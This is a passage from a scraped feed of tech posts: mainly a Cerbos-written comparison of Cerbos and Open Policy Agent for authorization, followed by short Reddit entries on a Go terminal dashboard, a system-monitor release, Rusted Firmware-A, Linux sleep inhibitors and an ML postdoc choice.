it.</p><p>OPA’s developer experience is geared toward those comfortable with infrastructure-as-code practices. Since OPA policies are code, developers work with them similarly to how they work with application code: editing text files, using Git for version control, writing unit tests (), and so on.</p><p>This  lets experienced engineers integrate OPA policies into CI/CD pipelines and treat them like any other codebase. For example, a team might require that any policy changes in Git trigger automated tests and deployment to OPA agents, ensuring that policies are validated and reviewed.</p><p>However, for the average developer or less-technical stakeholder, OPA can be challenging to use directly.</p><ul><li>There is no high-level SDK call akin to Cerbos’s  out of the box - typically, an application interacts with OPA by querying it, often via a REST or gRPC API call to a local OPA sidecar. While language SDKs (Go, JS, Java, Rust) are available, they essentially wrap these low-level calls. This means the developer must still define rule names (e.g., allow), construct and send the correct JSON input, and manually parse the decision response.</li><li>Setting up OPA in an app involves writing Rego policies and establishing how data (e.g. user attributes) is fed into OPA.</li><li>Debugging OPA policies usually requires using OPA’s built-in query tester or verbose trace logs, which is a more manual process compared to Cerbos’s built-in explanations.</li><li>Moreover, OPA lacks a native, user-friendly interface for policy authors. It’s largely a developer’s tool - policy changes require editing Rego files. Non-engineers or less technical team members typically cannot write OPA policies without training, which can limit who can contribute to authorization rules in an organization.</li></ul><p>While there are VS Code extensions for Rego, a playground for trying out policies, and community libraries for various languages to interact with OPA, the overall developer experience with OPA is best for teams that have the bandwidth to learn Rego and build tooling around it. It’s flexible and scriptable, but not as immediately approachable as Cerbos.</p><p>Cerbos follows an architecture tailored to application- and API-level authorization needs. At its core, Cerbos is a <strong>stateless Policy Decision Point (PDP)</strong> service that you can deploy alongside your application - either as a separate service, a sidecar container, or even embedded as a library in certain cases. Being stateless, each Cerbos instance doesn’t require its own database; it loads the policy files and uses in-memory evaluation for incoming requests. This makes Cerbos deployment quite flexible and lightweight - you can run it in a container on Kubernetes, on a VM, on-premises, or even on edge devices.</p><p>Many deployment models are supported:</p><ul><li>A  (one or a few Cerbos servers that all apps call into),</li><li>A  (each app instance has a Cerbos proxy next to it),</li><li>A  (Cerbos PDP in a Lambda, etc.),</li><li>An embedded library in Go apps or via first-class support for a WebAssembly runtime, depending on latency and isolation requirements.</li></ul><p>Cerbos’ architecture allows it to scale horizontally easily: you can spin up more Cerbos instances behind a load balancer to handle more load, since no instance holds unique state.</p><p>Cerbos’s internal engine is purpose-built for evaluating access control policies. The policy model (principal, resource, actions, conditions) is baked into the architecture, meaning that Cerbos knows how to interpret an incoming request with a principal’s attributes and a resource’s attributes against the loaded policies.</p><p>This specialization streamlines the decision process. The Cerbos PDP exposes APIs (HTTP and gRPC) for querying decisions, and these APIs are uniform - you send a decision request describing the actor and resource, and get back an allow/deny, plus, optional metadata like reasons or obligations.</p><p>Because Cerbos is stateless, <strong>operational complexity is low</strong>: there’s no need to manage distributed state or consensus. Policies can be updated by simply deploying new policy files or pointing Cerbos to a policy repository. Cerbos can watch a directory, Git repo, or cloud bucket for policy updates, or you can push updates via an API, depending on your setup.</p><p>We designed Cerbos’ architecture to be application-centric - it acts as a microservice that any app can call to get authorization decisions, running wherever your app runs, and focusing solely on that task.</p><p>Cerbos is increasingly being used to secure AI agents and microservices, including API gateways, LLM agents, and data filtering layers. Because Cerbos enforces context-aware, stateless decisions, it is ideal for scenarios where AI agents or services need to operate within strict access boundaries. For example, API gateway integration allows Cerbos to filter unauthorized requests before they reach backend services - a critical feature in AI architectures where misuse or oversharing of data can cause security breaches.</p><p>OPA’s architecture is built for <strong>general-purpose, distributed policy enforcement</strong>. OPA is essentially a policy decision engine that can be co-located with any software that needs decisions. A common architectural pattern is to run an OPA sidecar next to each service instance that needs authorization checks. Each OPA instance keeps the relevant policies and data in memory, ensuring that decisions are low-latency and local. This distributed deployment means that every service has its own policy evaluator, so, like Cerbos, there is no single point of failure or central bottleneck for policy decisions. OPA itself is stateless with respect to long-term storage; again, like Cerbos, it stores policies and data in memory and you feed it updates as needed.</p><p>The big difference is that OPA doesn’t come with a predefined data model for requests - you can decide what JSON structure to send to OPA and what output to expect, usually you define a rule that produces an  boolean or similar. This allows OPA to be inserted into many contexts: as an Envoy ext-authz filter, as a Kubernetes admission controller (OPA Gatekeeper), inside CI/CD pipelines for config checks, and more.</p><p>However, this flexibility comes at the cost of increased integration effort. Because OPA lacks a standardized data model, each integration typically requires custom schema design, input normalization, and output parsing—all of which can lead to duplicated effort, inconsistent policy outcomes, and higher maintenance overhead across teams.</p><p><strong>Deployment and integration</strong> of OPA can take a few forms.</p><ul><li>It can run as a separate daemon that your application calls via a REST API, or via a Go API if you embed OPA as a library in a Go program.</li><li>It can be compiled to WebAssembly (WASM) and embedded directly into applications written in any language that supports WASM.</li><li>In Kubernetes environments, a popular usage is Gatekeeper, where OPA is paired with custom resources to enforce policies cluster-wide.</li><li>In microservice architectures, you might see dozens of OPAs deployed, one per service or host, all kept in sync with the latest policies.</li></ul><p>OPA’s design assumes you will manage distribution of policy to these instances (more on that in the management section). Because each OPA instance is independent, scalability is achieved by adding OPA instances wherever needed.</p><p>The flip side is that <strong>OPA by itself is a lower-level component</strong> - you have to design how it fits into your system. Will your app call OPA on each API request? Will OPA intercept requests at the proxy layer? These decisions are left to the implementer.</p><p>In summary, OPA’s architecture is flexible and cloud-native: it’s a small engine you deploy alongside your code to offload policy decisions, enabling distributed policy enforcement at scale.</p><p>Cerbos’s focused design allows it to achieve high performance for authorization use cases - the Cerbos engine can evaluate permission checks very efficiently.</p><p>In fact, after we moved away from the general OPA engine and created a custom engine, Cerbos <a href=\"https://www.cerbos.dev/blog/from-opa-to-our-own-engine-cerbos#:~:text=First%2C%20we%20achieved%20dramatically%20better,means%20their%20applications%20respond%20faster\">achieved</a> decision evaluations compared to our earlier OPA-based implementation. In real terms, this means a Cerbos policy check typically takes only <strong>a fraction of a millisecond of CPU time</strong>. For a web application that might perform hundreds or thousands of permission checks per second, this optimization can reduce overall request latency and CPU load significantly.</p><p>Cerbos also optimized memory usage and startup time by not carrying any extra baggage beyond what’s needed for authZ decisions. The engine loads only the policy rules relevant to the defined resource types and roles, keeping the footprint small.</p><p>In practical scenarios, a single Cerbos instance can handle thousands of requests per second with minimal latency impact - often sub-millisecond per check. Because Cerbos is <a href=\"https://www.cerbos.dev/features-benefits-and-use-cases/stateless-authorization\">stateless</a> and horizontally scalable, you can run multiple instances to parallelize the load without coordination overhead.</p><p>Another aspect of performance is data fetching: Cerbos expects the caller to supply any needed context, like user attributes or resource attributes, with the request, rather than fetching data itself. This design avoids unpredictable I/O during policy evaluation - the policy decision is a pure function of the input. As long as your application provides the necessary data from a database or cache efficiently, Cerbos will evaluate the policy logic quickly.</p><p>This contrasts with some authorization systems that might pull in external data during a decision and slow things down.  One of the most common pieces of feedback we hear from users is that Cerbos delivers fast and predictable performance for authorization. That’s exactly what we aimed for when building our solution - targeting real-time user permission checks where every millisecond counts, and both benchmarks and user reports show it delivers on that promise.</p><p>In practice, each OPA decision is evaluated in-memory (against the policy and data it has loaded), so the typical overhead is small, often on the order of tens to hundreds of microseconds for simple policies.. The local or library-based architecture means that calls to OPA are usually a local function call or localhost HTTP call, avoiding network hops. This means OPA can be used in latency-sensitive paths without a major penalty.</p><p>That said, the <strong>actual performance of OPA depends on how complex your Rego policies are</strong> and how much data OPA has to chew through. Simple RBAC-style policies in Rego will evaluate fast. But if you write very complex rules or have megabytes of JSON data loaded into OPA for context, evaluation might be slower.</p><p>OPA does have advanced features like <strong>partial evaluation, similar to Cerbos,</strong> and prepared queries, which can reduce evaluation latency and CPU cost. Partial evaluation lets you pre-compute static sections of the query to produce an input-specific policy, thereby generating a simplified policy for repeated use.</p><p>In terms of memory footprint, OPA is fairly efficient in pure evaluation, but running many OPAs (one per service instance) means each has its copy of policies and data in memory. This is usually fine, but in memory-constrained environments, it’s a consideration. In contrast, a single central Cerbos might use memory more sparingly by sharing one loaded policy set. In summary, OPA provides good performance and can scale out by deploying more instances, but a targeted solution like Cerbos can outperform it for the specific case of application authZ due to custom optimizations. This difference will become very evident at extreme scales or under heavy load, where every bit of efficiency helps.</p><h2><strong>Policy management and administration</strong></h2><p>Managing policies in Cerbos is very straightforward, thanks to the product's focus on user needs and provided tooling. Since Cerbos policies are plain files (YAML/JSON), you can manage them using your normal code workflows: store them in a Git repository, code-review changes, and track versions. Cerbos facilitates this by supporting <strong>multiple storage backends for policies</strong> - you can <a href=\"https://docs.cerbos.dev/cerbos/latest/configuration/storage\">load policies</a> from the local filesystem, a Git repo, a cloud storage bucket, or a database, whichever fits your deployment model.</p><p>In a simple setup, you might bake the policies into your application container image or mount them via a volume. For more dynamic scenarios, Cerbos can watch a Git repository or be instructed to pull updated policies periodically, so that all running instances get the latest rules. This makes distributing policy updates across environments easier.</p><p>For auditing and administration, Cerbos has built-in <a href=\"https://www.cerbos.dev/features-benefits-and-use-cases/audit-logs\">features to log</a> every decision and even every policy change. Every Cerbos PDP can output  detailing which access requests were allowed or denied, including contextual information. These logs can be aggregated for compliance audits or debugging security incidents. This is one of the features security, compliance, and leadership teams appreciate most, as it gives them greater control and peace of mind.</p><p>Cerbos also provides an admin API, and through the commercial offering - an authorization management solution called , to manage policies centrally.</p><p>Cerbos Hub is a hosted control plane that organizations can use to collaborate on policy editing, continuous test running, and deploying policies from development to production. It offers capabilities like <strong>centralized policy management of multiple PDP instances, unified audit log viewing, and a policy testing playground</strong>. This means that a team can use a SaaS control plane interface to update policies and push them out to all their Cerbos nodes, rather than dealing with each instance separately. The clarity and auditability of Cerbos policies also help streamline security reviews and demonstrate internal controls during audits.</p><p>Even without Cerbos Hub, Cerbos’ open source core includes CLI tools and an interactive <a href=\"https://docs.cerbos.dev/cerbos/latest/policies/authoring_tips.html#:~:text=Policy%20authoring%20,to%20help%20you%20design%20policies\">policy editor</a> (for example, a VS Code extension or the ability to run a local UI) to simplify writing policies. Importantly, Cerbos’s approach allows not just developers but also security engineers or system administrators to participate - the YAML syntax is approachable enough that with a little training, it’s readable by less technical stakeholders, and the existence of a UI and documentation lowers the barrier for collaboration.</p><p>For platform leaders or compliance executives, this translates into lower onboarding and ramp-up costs, less reliance on specialist roles, and faster policy iteration cycles. With Cerbos, engineering teams can move quickly and autonomously without introducing compliance or operational risk, enabling organizations to deliver features faster while meeting governance requirements.</p><p>It’s important to mention that Cerbos also goes far beyond traditional role-based models to support . Instead of forcing B2B platforms into static roles like \"Admin\" or \"Editor\", Cerbos enables teams to model each customer's unique organizational structure, custom roles, and internal permissions - without rewriting code. This flexibility is essential for SaaS providers scaling into enterprise markets, where customers expect software to reflect their own hierarchy, not the vendor's limitations.</p><p>Cerbos also centralizes policies across all identity types, including users, services, and non-human identities like AI agents. For AI workloads, Cerbos acts as the safety layer that contains and governs the actions of autonomous systems, ensuring every request adheres to the principle of least privilege. Enterprise buyers rely on these controls to mitigate risk, meet compliance requirements, and trust that access is enforced consistently at every layer of the stack.</p><p>In terms of maintenance overhead, Cerbos aims to be a “deploy and forget” component: once integrated, it requires minimal babysitting. There are no complex databases to maintain, and health checks mostly boil down to ensuring the service is up and has the latest policies.  The  also simplifies versioning and rollback - if something goes wrong with a new policy, you can revert the file in Git and redeploy or instruct Cerbos to reload, without dealing with migrations or corrupted state.</p><p>Users have <a href=\"https://www.cerbos.dev/blog/framework-evaluating-authorization-providers-solutions#:~:text=onboarding%20and%20best%20practices%3F%20Many,to%20rely%20on%20the%20community\">noted</a> that Cerbos is one of those things “that just works,” with the team behind Cerbos being very responsive (24/7 support) if any issues arise. The combination of operational stability and quality support is a big reason why teams trust Cerbos to power critical authorization decisions at scale.</p><p>Cerbos is built to scale from small teams to complex enterprise environments. It supports multi-region deployment, centralized policy control with Cerbos Hub, fine-grained audit trails, and full API-driven policy CI/CD. Enterprises choose Cerbos not just for ease-of-use, but because it meets their governance, security, and performance requirements at scale.</p><p>Features like multi-tenant policy segregation, enterprise SSO support, and structured audit logging make Cerbos ideal for regulated and high-scale environments. Several Cerbos customers have replaced in-house or commercial solutions like OPA+Styra for these very reasons.</p><p>OPA, by design, provides only the policy engine, leaving policy management up to the user, or third-party tools. This is a conscious choice to keep OPA agnostic and flexible, but it means that out-of-the-box, OPA doesn’t include a centralized UI or automatic distribution system for policies.</p><p>Instead, it exposes  that you can use to build your own control plane. For example, OPA can be configured to periodically download policy bundles from a remote HTTP server. Many OPA deployments use this model: you package your Rego policies, and any JSON data, into a bundle file and host it on a service, and each OPA instance is configured to pull updates from there. This way, when you update the policy bundle, say, by committing to a Git repo and having a CI job build a new bundle, all OPAs will fetch the new version.</p><p>Similarly, OPA can emit  to a remote endpoint of your choice. An organization might run a centralized log collector, or use a SaaS logging platform, and configure each OPA to POST every decision (allow/deny and related info) to that endpoint. This provides an audit trail, but again it’s on the user to set up receivers and storage for those logs. OPA’s management API also has a status endpoint to report health and bundle version, which a control plane can use to monitor if OPAs are up-to-date.</p><p>In practice, companies that adopt OPA at scale often either build an internal control plane or use a commercial service. Open-source users of OPA have also crafted their own solutions: some use configuration management or service mesh integrations to distribute policy files, others integrate OPA policy updates into application deploy pipelines. The key point is that <strong>OPA gives you the hooks to manage a fleet of policy agents, but it doesn’t dictate how you should do it</strong>. This can be a positive if you want full control (for example, if you want to integrate policy deployment with your existing GitOps process), but it can be a negative if you were expecting a plug-and-play admin UI or a one-click sync of policies across all agents.</p><p>Regarding multi-tenancy and organization-wide governance, OPA can handle multi-tenant data by scoping data per tenant in the policy, since you can load data for different tenants into OPA’s memory and separate via conditions. But there’s no built-in concept of multi-tenant policy isolation aside from what you implement in Rego or via separate OPA instances.</p><p>Monitoring OPA instances in production, checking they’re all running the latest policy, for instance, is another operational task; OPA can report its status, but you’ll need to aggregate those reports. In summary, managing OPA in production involves more effort in building the pipelines and tools around it. You get good flexibility: you can tie policy updates to your exact workflows. On the other hand, the <strong>administrative experience is more involved</strong>. Non-technical users will likely not interface with OPA directly at all - they might only consume reports or request features from the engineers managing OPA. Everything from policy authoring to distribution to auditing is oriented around engineers and code processes.</p><p>Certain organizations are willing to accept this for the benefit of OPA’s versatility. For organizations looking to enforce fine-grained, auditable access control across application stacks, APIs, AI agents, and service-to-service infrastructure, this level of DIY management becomes a liability - not a strength. Cerbos offers a unified approach to policy management that serves the needs of both engineering teams and enterprise buyers: from securing non-human identities to implementing zero-trust controls across microservices, Cerbos simplifies what OPA leaves as an exercise for the implementer.</p><p>It’s often this management overhead, and the earlier mentioned learning curve, that guide companies towards using OPA for broad infrastructure policy enforcement, and Cerbos for application- and API-level authorization where ease of management is a higher priority.</p><p>To summarize, let’s look at a quick comparison of OPA and Cerbos on key aspects.</p><h2><strong>Overview and key differences between Cerbos and OPA</strong></h2><table><tbody><tr><td>Purpose-built for application and API-layer authorization (fine-grained RBAC/ABAC in apps, APIs, AI agents, and gateway interfaces).  Cerbos is also well-suited for protecting LLM-based tools, RAG pipelines, and other non-human identity systems that must enforce strict data access boundaries.</td><td>General-purpose  for  (not just authZ) - used for infrastructure, Kubernetes, microservices, as well as application logic. Not specialized for app business logic by default.</td></tr><tr><td> (declarative config). Policies are written in YAML with conditions in CEL expressions. Familiar format with a low learning curve; no new programming language needed.</td><td> (declarative code). Policies are written in Rego, a Datalog-like language. Very flexible and expressive, but has a higher learning curve and unique syntax. Policies can return arbitrary data structures, not just booleans.</td></tr><tr><td> policies are declarative YAML with a defined structure. Cerbos has built-in support for common authZ models (RBAC, ABAC, PBAC, role hierarchies, tenant isolation, etc.), which means less boilerplate. The policy outcome is always an allow/deny decision (plus optional aux data), providing clarity and consistency.</td><td> you write rules in Rego. OPA doesn’t impose a specific domain model - which is flexible but means you must define your own schemas for roles, permissions, etc. There’s no first-class concept of “role” or “resource hierarchy”; you implement those via data and rules.</td></tr><tr><td>: Can run as a centralized PDP service or as a sidecar next to your app. Supports REST and gRPC APIs, so any language/platform can query it. Cerbos instances are stateless; they load policy files into memory and evaluate requests purely based on input (context you pass). Horizontal scaling is straightforward.</td><td>: Typically run OPA as a sidecar or library within each service that needs policy decisions (ensures low latency local decisions). Each OPA keeps policies/data in-memory. No central server by default (to avoid single point of failure). Requires a way to distribute and sync policies/data to all those instances (e.g. bundles, control plane).</td></tr><tr><td><strong>Cerbos evaluates decisions based on context passed in the API request</strong> (principal attributes, resource data, etc.): It does not fetch external data during evaluation - you supply all needed info, often by pre-loading from a database in your app. This makes the data flow explicit and keeps the PDP fast (no mystery network calls during evaluation). Cerbos can be configured to load static reference data on startup, but there is no complex data plane to maintain.</td><td><strong>Allows policy to load data</strong>: static JSON data files can be packaged with policies, or policies can call out via the http.send builtin to fetch data at runtime. This flexibility is powerful but means you must manage data updates (e.g. push new bundles or accept the latency of in-policy HTTP calls).</td></tr><tr><td><strong>High-performance optimized for authorization</strong>: After initially using OPA internally, the Cerbos team built a custom engine for authZ, yielding  decision evaluations than the earlier OPA-based version. In real-world use, Cerbos can handle thousands of authZ decisions per second with sub-millisecond latency. The engine is optimized in memory and CPU footprint for access control scenarios.</td><td><strong>High-performance engine written in Go</strong>: In sidecar mode, decisions are local and avoid network hops. Typical decisions in milliseconds or less. However, evaluating Rego can incur overhead, especially for complex policies or large data sets, and in practice OPA policy evaluation might be slower for app authZ use cases compared to a specialized engine.</td></tr><tr><td><strong>Observability &amp; debugging</strong></td><td><strong>Cerbos provides detailed audit logs and explainability out-of-the-box:</strong> Every decision can include a reason and the policy rule that triggered it. This helps during development and in production audits to see  a request was allowed/denied. Cerbos also offers a CLI tool for policy testing and a UI Playground for trying out scenarios, which improve the developer experience.</td><td><strong>OPA can produce decision logs</strong> (JSON structured logs of inputs/outputs) which you can aggregate. It also has a trace mode to debug how a decision was made, but the output is geared towards developers familiar with Rego. No built-in end-user-friendly explanations.</td></tr><tr><td>: Simple APIs/SDKs for checks (pass principal, resource, action). Easy to integrate via REST/GRPC. Built-in policy test tools and human-readable policy files. Detailed decision explanations and audit logs help with debugging and compliance.</td><td>: Requires writing policies as code (Rego). Integration via REST API, Go library, or sidecar calls. Strong integration with DevOps pipelines (treat policies like code with tests, CI/CD). Steeper learning curve for developers; less accessible to non-engineers.</td></tr></tbody></table><p>Both OPA and Cerbos are effective in their domains.</p><p>The choice isn’t strictly “one is universally better than the other,” but rather which tool is better suited for the task at hand.</p><p>If you’re building or scaling a <strong>modern application with fine-grained access control requirements</strong>, Cerbos offers significant advantages in simplicity, performance, and maintainability. It's built to scale alongside your business. From regulated environments to AI-powered interfaces and APIs, Cerbos provides the performance, governance, and flexibility that enterprises demand.</p><p>OPA paved the way by popularizing policy-as-code, yet its generality can become a burden for teams that just need straightforward authorization in their apps.</p><p>Cerbos picks up where OPA leaves off, providing a developer-centric experience tailored to application- and API-level use cases, along with all the tooling and infrastructure needed to run it efficiently in production. It enables teams to implement granular roles and permissions in hours, not months, and evolve authorization logic safely as requirements change.</p><p><em>If you’re looking to enforce fine-grained, contextual, and continuous authorization across apps, APIs, AI agents, MCPs, services and workloads - feel free <a href=\"https://www.cerbos.dev/product-cerbos-hub\">give Cerbos a try.</a> If you’re curious how Cerbos could fit into your architecture or have specific requirements to discuss, feel free to book a <a href=\"https://www.cerbos.dev/workshop\">call with a Cerbos engineer</a> for a free 1:1 session. With Cerbos, you can achieve robust, scalable authorization  the steep learning curve - empowering your team to focus on building features rather than reinventing access control.</em></p>","contentLength":34219,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1muh9vh/cerbos_vs_opa_comparing_policy_language_developer/"},{"title":"My first project in Go is a terminal dashboard (and wow, what a programming language)","url":"https://www.reddit.com/r/golang/comments/1muh0x9/my_first_project_in_go_is_a_terminal_dashboard/","date":1755606541,"author":"/u/Vinserello","guid":233313,"unread":true,"content":"<p>Just wrapped up my first Go project and wow, what a language. I'm a WebDev but I studied both C and C++: Go feels like the smart, minimalist cousin that cuts the fluff but keeps the power.</p><p>- Compilation is instant - Syntax is clean and predictable<p> - The tooling is chef's kiss (</p>)</p><p>To test the waters, I built something fun:</p><p> that is a CLI tool that turns CSV/JSON/API data into beautiful terminal dashboards with a single command.</p><p>No GUI. Just pure terminal magic:</p><pre><code>datacmd --generate --source=data.csv </code></pre><p>Supports pie charts, gauges, tables, live system metrics, and it's built on top of .</p><p>I see  was missing pie charts, tables and radar chart, so I tried implementing myself.</p><p>GitHub: <a href=\"https://github.com/VincenzoManto/datacmd\">github.com/VincenzoManto/datacmd</a> Feedback and PRs welcome (probably there a lot of bugs) - I’d love to grow this into a go-to tool for devs who live in the terminal.</p>","contentLength":841,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"PULS v0.3.0 RELEASED","url":"https://www.reddit.com/r/linux/comments/1mugukw/puls_v030_released/","date":1755606067,"author":"/u/word-sys","guid":233504,"unread":true,"content":"<div><p>PULS is a responsive and feature-rich system monitoring dashboard that runs in your terminal. This version includes significant improvements, bug fixes, and new features over the original implementation.</p><ul><li>: Corrected CPU usage calculation per process</li><li>: 1-second refresh rate with smooth 60 FPS UI</li><li>: Reduced memory footprint and eliminated memory leaks</li></ul><ul><li>: More comprehensive process information</li><li>: Improved diagnostics and low-resource operation</li><li>: Smoother animations, better color schemes, responsive design</li><li><strong>Improved Container Support</strong>: Better Docker integration with more metrics</li><li>: Enhanced network interface monitoring</li><li>: CPU and GPU temperature monitoring</li><li>: Search and filter processes</li><li>: Multiple sorting options for processes</li></ul><ul><li>Smooth 60 FPS rendering with 1-second data refresh</li><li>Multiple color schemes (Dark, Light, Matrix, High Contrast, Solarized)</li><li>Responsive design that adapts to terminal size</li><li>Better error handling and status indicators</li><li>Enhanced sparkline graphs with history</li><li>Improved keyboard navigation</li></ul><ul><li>Async data collection with proper timeouts</li><li>Efficient memory usage with history management</li><li>Reduced CPU overhead for UI rendering</li><li>Smart refresh rates (UI: 60 FPS, Data: 1 Hz)</li><li>Optimized container monitoring</li></ul></div>   submitted by   <a href=\"https://www.reddit.com/user/word-sys\"> /u/word-sys </a>","contentLength":1218,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"AI is a Junior Dev and needs a Lead","url":"https://www.reddit.com/r/programming/comments/1mugchx/ai_is_a_junior_dev_and_needs_a_lead/","date":1755604691,"author":"/u/that_guy_iain","guid":233310,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/that_guy_iain\"> /u/that_guy_iain </a> <br/> <span><a href=\"https://getparthenon.com/blog/ai-is-a-junior-dev-and-needs-a-lead\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mugchx/ai_is_a_junior_dev_and_needs_a_lead/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Introducing Rusted Firmware-A (RF-A) - A Rust-Based reimagination of Trusted Firmware-A","url":"https://www.trustedfirmware.org/blog/rf-a-blog","date":1755604400,"author":"/u/kisimre","guid":233382,"unread":true,"content":"<p>We are excited to unveil Rusted Firmware-A, a new open-source project that reimagines Trusted Firmware-A (TF-A) using Rust. Developed collaboratively by engineers at Arm and Google, Rusted Firmware-A is a ground-up redesign that leverages the strengths of a modern systems programming language specifically designed to address key limitations of traditional approaches, with a strong focus on safety and performance.</p><p>: <em>Rusted Firmware-A is a Rust-first implementation of Trusted Firmware-A for the latest Arm A-class processors. It’s open source, security by design, legacy-free, and built with the future in mind. This is just the beginning. The project welcomes your feedback as it evolves.</em></p><p>TF-A has served the Arm ecosystem reliably for many years. However, it carries evolutionary and legacy artifacts accumulated over time. Rusted Firmware-A gives us a great opportunity to:</p><ul><li> from using Rust.</li><li>, allowing the codebase to be more maintainable.</li><li><strong>Redesign with clarity and modularity</strong>, taking advantage of Rust’s rich type system and error handling.</li><li><strong>Catch more bugs at compile time</strong>, reducing risks in sensitive firmware environments.</li><li><strong>Align with modern security guidance</strong> from regulators and security standards bodies.</li></ul><p>The C TF-A will continue to be supported and maintained including Long-Term Support (LTS) versions that remain first-class for many years. However, with Rusted Firmware-A, we’re refreshing the implementation for the future.</p><p>Rusted Firmware-A starts with a blank sheet, targeting the latest Arm A-class processors. Older architecture versions and extensions are out of scope. Some key principles:</p><ul><li>Requires more modern features like GICv3, DSU, and hardware-assisted coherency.</li><li>Certain interfaces will not be reimplemented in Rusted Firmware-A.</li><li>It’s a reference implementation suitable for future product releases.</li><li>Intended for use on Arm FVP and QEMU platforms in the early stages.</li></ul><h2>Project Status and Roadmap</h2><p>We are currently working on an early prototype and published v0.1 for use. This version will serve as a public signal that the codebase is available and open for feedback.</p><ul><li>Initial design &amp; architecture review</li><li>Core firmware framework in Rust</li><li>Early platform support (FVP, QEMU)</li><li>RFC on migration paths and feature set</li><li>Toward v1.0: stabilization</li></ul><p>: We’re looking to productize Rusted Firmware-A in a few years. Until then, expect rapid iteration and community-driven evolution.</p><h2>Open Source and Collaboration</h2><p>Rusted Firmware-A is open source. You can explore the project, feedback, contribute or track progress at:</p><p>Currently, contributions from  and  are given priority. We welcome external contributions on a best-effort basis during the early phases.</p><p>We anticipate providing <strong>a migration path from TF-A to</strong> Rusted Firmware-A once the project matures. Our intent is to eventually do all new firmware development in Rusted Firmware-A.\nHowever:</p><ul><li>C TF-A will  be deprecated or end-of-lifed immediately.</li><li>LTS branches of C TF-A will remain fully supported for their 7-year lifetime durations.</li><li>Partners and vendors can continue using C TF-A for existing and upcoming products.</li></ul><p>Rusted Firmware-A is early but promising. The v0.1 release is available. clone the repository, explore the issues, and let us know what you think.</p><p>Whether you’re considering adoption or contribution, your feedback is essential. Please share your thoughts:</p><ul><li>Publicly (via mailing list and Discord)</li><li>Or via Tech forum meetings</li></ul><p>We’re especially interested in:</p><ul><li>Hardware-specific constraints</li><li>Preferred timelines for adoption</li><li>Migration blockers and integration concerns</li><li>Candidates for new Arm architecture crates</li></ul><p>Let’s build the next generation of secure Arm firmware together.</p><ol><li><p><strong>Why write Rusted Firmware-A in Rust?</strong>\nTo ensure memory safety, reduce legacy baggage, improve maintainability, and leverage Rust’s type system to catch more bugs earlier.</p></li><li><p>\nAbsolutely not. It has served us well. Rusted Firmware-A is an opportunity for a modern reimplementation.</p></li><li><p><strong>Will both versions be developed in parallel?</strong>\nFor now, yes. But maintaining feature parity long-term is unsustainable. Eventually, Rusted Firmware-A will become the default for new development.</p></li><li><p><strong>What if I need features missing in Rusted Firmware-A?</strong>\nRusted Firmware-A will not support all the features supported by TF-A today. Please continue using C TF-A if those are required.</p></li><li><p><strong>Where can I find the RUSTED FIRMWARE-A roadmap and status?</strong>\nWe’ll publish a roadmap shortly. In the meantime, track our <a href=\"https://github.com/RustedFirmware-A/rusted-firmware-a/issues\">GitHub issues</a>.</p></li><li><p><strong>Are there plans to transition other Trusted Firmware projects to Rust?</strong>\nThere are currently no plans to transition other Trusted Firmware projects to Rust. The existing projects will continue to be actively maintained in their current implementation languages.</p></li></ol><h2>About TrustedFirmware.org</h2><p>TrustedFirmware.org is an open source project implementing foundational software components for creating secure devices. Trusted Firmware provides a reference implementation of secure software for processors implementing both the A-Profile and M-Profile Arm architecture. It provides SoC developers and OEMs with a reference trusted code base complying with the relevant Arm specifications. Trusted Firmware code is the preferred implementation of Arm specifications, allowing quick and easy porting to modern chips and platforms. This forms the foundations of a Trusted Execution Environment (TEE) on application processors, or the Secure Processing Environment (SPE) of microcontrollers.</p>","contentLength":5393,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mug923/introducing_rusted_firmwarea_rfa_a_rustbased/"},{"title":"Information about sleep inhibitors","url":"https://www.reddit.com/r/linux/comments/1mufvok/information_about_sleep_inhibitors/","date":1755603311,"author":"/u/VanillaWaffle_","guid":233503,"unread":true,"content":"<p>I have aggressive power saving option but amazed how well it worked (GNOME). </p><p>When i have something downloading, its just turning off the screen instead of suspend. But if its only seeding, it know to suspend as well. When watching youtube videos, it doesnt turn off the screen even after hours not touching the mouse or keyboard. But somehow when i watch music videos instead, it know to turn off the screen after a while. How does it even work?</p><p>But when i check systemd inhibitor list, it only show some upower and network manager stuff. Is there any information so i customize it even more?</p>","contentLength":591,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Switching to postdoc in ML for Earth Observation?","url":"https://www.reddit.com/r/MachineLearning/comments/1mufrkc/d_switching_to_postdoc_in_ml_for_earth_observation/","date":1755602961,"author":"/u/councilanderson2","guid":233311,"unread":true,"content":"<p>I’d like to hear from people working with ML for Earth Observation.</p><p>My PhD was pretty broad. I used deep learning on different types of multimedia data (video, image, text, and MIDI). The outcome has been mediocre: h-index of 5, about 90 citations, mostly in Q1 journals, but no top conferences. I want to stay in academia and use a postdoc to build a clearer niche.</p><p>In multimedia and in most areas of ML, a lot of the progress comes from a small group of top institutions. It has been hard to see where my own work really makes a difference. That’s why I’ve been looking at ML for Earth Observation and climate change. The work seems more meaningful, but the field is smaller and the papers tend to get less visibility and fewer citations.</p><p>My worry is that switching to Earth Observation could slow down my citation count and h-index. I know people say these metrics don’t matter much, but I feel like they still play a big role in getting academic jobs. On the other hand, if I don’t end up with a permanent academic position and move to industry, I worry that Earth Observation skills won’t transfer well since there aren’t as many opportunities compared to mainstream ML.</p><p>I’d really like to hear from people in the field about how you see these trade-offs.</p>","contentLength":1272,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Prime Number Grid","url":"https://www.reddit.com/r/programming/comments/1mufl1a/prime_number_grid/","date":1755602412,"author":"/u/sparklingsphere","guid":233336,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/sparklingsphere\"> /u/sparklingsphere </a> <br/> <span><a href=\"https://susam.net/primegrid.html\">[link]</a></span> &#32; <span><a 